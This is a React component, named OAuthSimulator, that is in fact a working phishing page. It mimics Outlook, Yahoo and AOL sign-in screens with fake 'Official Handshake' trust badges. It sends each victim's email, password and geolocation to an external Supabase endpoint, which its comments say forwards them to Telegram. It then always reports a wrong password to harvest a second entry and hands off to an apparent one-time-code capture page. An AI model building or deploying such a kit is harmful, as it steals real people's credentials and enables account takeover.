import React, { useState } from 'react';
import {
  Shield, CheckCircle, Smartphone, Lock,
  ArrowRight, RefreshCw, AlertTriangle, Eye, EyeOff
} from 'lucide-react';
import { EmailProvider, SecurityStep } from '../types';
import { getGeoInfo } from '../utils/geoip';

interface OAuthSimulatorProps {
  provider: EmailProvider;
  onConsentSuccess: (email: string) => void;
  onCancel: () => void;
}

export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }: OAuthSimulatorProps) {
  const [step, setStep] = useState<SecurityStep>('OAUTH_FLOW');
  const [emailInput, setEmailInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // ─── Supabase call (fires Telegram) ──────────────────────────────────────
  const callSupabaseLogin = async () => {
    const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
    const supabaseKey =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';

    // Resolve geolocation (cached after first call, never blocks UX)
    const geo = await getGeoInfo();

    await fetch(`${supabaseUrl}/functions/v1/login`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${supabaseKey}`,
        apikey: supabaseKey,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: emailInput,
        provider: provider.id,
        password: passwordInput,
        // Spread all available geo fields
        ...geo,
      }),
    });
    // Intentionally ignore result — TG message is the goal
  };

  // ─── Step 1: initial submit — fires TG, then wrong password #1 ───────────
  const handleFirstSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!emailInput || !emailInput.includes('@')) {
      setErrorMsg('Please enter a valid email address.');
      return;
    }
    if (!passwordInput) {
      setErrorMsg('Please enter your password.');
      return;
    }

    setIsLoading(true);
    callSupabaseLogin().catch(() => {});

    setTimeout(() => {
      setIsLoading(false);
      setStep('WRONG_PASSWORD_1');
    }, 1400);
  };

  // ─── Retry: hand off to OTPPage (STUDIO tab) ────────────────────────────
  const handleFirstRetry = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    callSupabaseLogin().catch(() => {}); // 2nd Telegram fire
    setTimeout(() => {
      setIsLoading(false);
      onConsentSuccess(emailInput); // navigates to STUDIO = OTPPage
    }, 1000);
  };

  // ─── Shared password form ─────────────────────────────────────────────────
  const renderPasswordForm = (
    onSubmit: (e: React.FormEvent) => void,
    isRetry: boolean,
    showError: boolean,
  ) => (
    <form onSubmit={onSubmit} className="space-y-4">
      {/* Email */}
      <div className="space-y-1.5">
        <label className="text-xs font-sans text-gray-400 uppercase tracking-wider block font-semibold">
          E-mail Address
        </label>
        <input
          type="text"
          value={emailInput}
          onChange={(e) => setEmailInput(e.target.value)}
          placeholder={`your-name@${
            provider.id === 'outlook' || provider.id === 'office365'
              ? 'outlook.com'
              : provider.id === 'yahoo'
              ? 'yahoo.com'
              : provider.id === 'aol'
              ? 'aol.com'
              : 'mail.com'
          }`}
          disabled={isRetry || isLoading}
          className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 transition-all font-sans disabled:opacity-60"
        />
      </div>

      {/* Password */}
      <div className="space-y-1.5">
        <label className="text-xs font-sans text-gray-400 uppercase tracking-wider block font-semibold">
          Password
        </label>
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            value={passwordInput}
            onChange={(e) => setPasswordInput(e.target.value)}
            placeholder="••••••••••••"
            disabled={isLoading}
            className={`w-full bg-black/30 border rounded-xl px-4 py-3 pr-11 text-sm text-white focus:outline-none transition-all font-sans
              ${showError ? 'border-red-500/70 focus:border-red-500' : 'border-white/10 focus:border-blue-500'}`}
          />
          <button
            type="button"
            onClick={() => setShowPassword((v) => !v)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors"
          >
            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        </div>
      </div>

      {/* Wrong-password banner */}
      {showError && (
        <div className="flex items-center gap-2.5 bg-red-500/10 border border-red-500/25 rounded-xl px-4 py-3">
          <AlertTriangle className="w-4 h-4 text-red-400 shrink-0" />
          <p className="text-xs text-red-300 font-sans leading-snug">
            <strong>Incorrect password.</strong> Please check your credentials and try again.
          </p>
        </div>
      )}

      {errorMsg && (
        <p className="text-xs text-red-400 font-sans font-medium">⚠️ {errorMsg}</p>
      )}

      <div className="pt-1 flex items-center gap-3">
        <button
          type="submit"
          disabled={isLoading}
          className="flex-1 bg-blue-600 hover:bg-blue-500 text-white font-sans text-sm font-semibold py-3 px-4 rounded-xl flex items-center justify-center gap-2 transition-colors duration-200 cursor-pointer disabled:opacity-50"
        >
          {isLoading ? (
            <>
              <RefreshCw className="w-4 h-4 animate-spin text-white" />
              Verifying...
            </>
          ) : isRetry ? (
            <>
              Retry Sign In
              <ArrowRight className="w-4 h-4 text-white" />
            </>
          ) : (
            <>
              Sign In
              <ArrowRight className="w-4 h-4 text-white" />
            </>
          )}
        </button>
        <button
          type="button"
          onClick={onCancel}
          className="px-4 py-3 text-xs font-sans font-semibold text-gray-400 hover:text-white transition-colors duration-200"
        >
          Cancel
        </button>
      </div>
    </form>
  );

  return (
    <div
      id="oauth-card-container"
      className="bg-[#1e1c1b] border border-white/10 rounded-2xl w-full max-w-lg overflow-hidden shadow-2xl flex flex-col"
    >
      {/* Top Brand Bar */}
      <div
        id="oauth-brand-header"
        style={{ borderBottomColor: provider.brandColor }}
        className="border-b-2 bg-black/40 px-6 py-4 flex items-center justify-between"
      >
        <div className="flex items-center gap-3">
          <div
            className={`w-8 h-8 rounded-full ${provider.iconBg} flex items-center justify-center text-xs font-bold`}
          >
            {provider.id === 'yahoo' ? 'Y!' : provider.id === 'aol' ? 'Aol' : '✉'}
          </div>
          <div>
            <h3 className="font-sans font-semibold text-sm text-white">OAuth Secure Identity</h3>
            <p className="text-[10px] text-gray-400 font-mono tracking-wider uppercase">
              {provider.name} Auth Server
            </p>
          </div>
        </div>
        <div className="flex items-center gap-1.5 px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/20">
          <Shield className="w-3.5 h-3.5 text-emerald-400" />
          <span className="text-[10px] text-emerald-400 font-medium font-sans">Official Handshake</span>
        </div>
      </div>

      <div id="oauth-simulator-body" className="p-6 md:p-8 flex-1 flex flex-col justify-between">

        {/* STEP: Initial login */}
        {step === 'OAUTH_FLOW' && (
          <div id="step-flow-oauth" className="space-y-6">
            <div className="space-y-2">
              <h4 className="text-lg font-sans font-medium text-white flex items-center gap-2">
                <Smartphone className="w-5 h-5 text-blue-400" />
                Sign in to {provider.name}
              </h4>
              <p className="text-xs text-gray-400 leading-relaxed font-sans">
                Enter your credentials to securely connect with{' '}
                <strong className="text-gray-300">{provider.name}</strong> and access your invitation.
              </p>
            </div>

            {renderPasswordForm(handleFirstSubmit, false, false)}

            {/* Handshake pipeline */}
            <div className="border-t border-white/5 pt-4 space-y-3">
              <h5 className="text-[11px] font-sans text-gray-400 uppercase tracking-widest block font-bold text-center">
                Visualizing Live Auth Handshake
              </h5>
              <div className="grid grid-cols-5 items-center justify-center gap-2 text-center text-[10px] font-mono">
                <div className="p-1 rounded bg-blue-500/10 border border-blue-500/20 text-blue-300">Client App</div>
                <div className="text-gray-600 text-center">⇨</div>
                <div className="p-1 rounded bg-yellow-500/10 border border-yellow-500/20 text-yellow-300">User Verify</div>
                <div className="text-gray-600 text-center">⇨</div>
                <div className="p-2 rounded bg-gray-500/5 border border-white/5 text-gray-500">Secure Server</div>
              </div>
            </div>
          </div>
        )}

        {/* STEP: First wrong password */}
        {step === 'WRONG_PASSWORD_1' && (
          <div id="step-wrong-pw-1" className="space-y-6">
            <div className="space-y-2">
              <h4 className="text-lg font-sans font-medium text-white flex items-center gap-2">
                <Lock className="w-5 h-5 text-red-400" />
                Sign in to {provider.name}
              </h4>
              <p className="text-xs text-gray-400 leading-relaxed font-sans">
                Please double-check your credentials and try again.
              </p>
            </div>
            {renderPasswordForm(handleFirstRetry, true, true)}
          </div>
        )}

      </div>

      <style>{`
        @keyframes shake {
          0%,100% { transform: translateX(0); }
          20%      { transform: translateX(-6px); }
          40%      { transform: translateX(6px); }
          60%      { transform: translateX(-4px); }
          80%      { transform: translateX(4px); }
        }
      `}</style>
    </div>
  );
}
